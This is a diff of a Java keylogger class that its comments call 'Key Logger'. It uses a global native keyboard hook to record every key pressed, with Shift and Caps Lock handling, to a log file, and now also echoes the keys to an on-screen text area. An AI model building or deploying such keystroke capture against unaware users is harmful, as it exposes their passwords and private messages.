@@ -3,11 +3,16 @@ package utility;
 import java.awt.Toolkit;
 import java.awt.event.KeyEvent;
 
+import javax.swing.JTextArea;
+
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import UI.MainUI;
+import sun.applet.Main;
+
 /**
- * @author avAnkyAnkit last modified @18-Mar-2018 @1:31:45 AM Key Logger - TODO
+ * @author avAnkyAnkit last modified @21-Mar-2018 @2:31:45 AM Key Logger - TODO
  */
 
 public class keyStroke implements NativeKeyListener {
@@ -17,15 +22,22 @@ public class keyStroke implements NativeKeyListener {
 	private FileReadWrite op;
 	private boolean run;
 	private long lastVisit;
+	private JTextArea mFeed;
 
-	public keyStroke(String path) {
-		op = new FileReadWrite(path);
+	public keyStroke(String path, FileReadWrite op, JTextArea mFeed) {
+		this.op = op;
+		this.mFeed = mFeed;
+		// op = new FileReadWrite(path);
+		mFeed.setText("");
 		lastVisit = System.currentTimeMillis();
 	}
 
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent e) {
+		
+		String addTofeed = "";
 		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
+		 System.out.println("keyStroke" + key);
 		if (!run)
 			return;
 
@@ -34,24 +46,25 @@ public class keyStroke implements NativeKeyListener {
 			boolean isShift = lastKey.equals("Shift");
 			boolean isOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
 			if ((isOn && isShift) || ((!isOn) && (!isShift))) {
+				addTofeed = key.toLowerCase();
 				op.add(key.toLowerCase());
-				// System.out.println("key add " + key.toLowerCase());
 			} else {
 				long Delay = System.currentTimeMillis() - lastVisit;
 				if (Delay <= 500) {
+					addTofeed = key;
 					op.add(key);
-					// System.out.println("key add " + key);
 				} else {
+					addTofeed = key.toLowerCase();
 					op.add(key.toLowerCase());
-					// System.out.println("key add " + key.toLowerCase());
 				}
 			}
 		} else {
+			addTofeed = key;
 			op.add(key);
-			// System.out.println("added " + key);
 		}
 		lastVisit = System.currentTimeMillis();
 		this.lastKey = key;
+		mFeed.append(addTofeed);
 	}
 
 	@Override
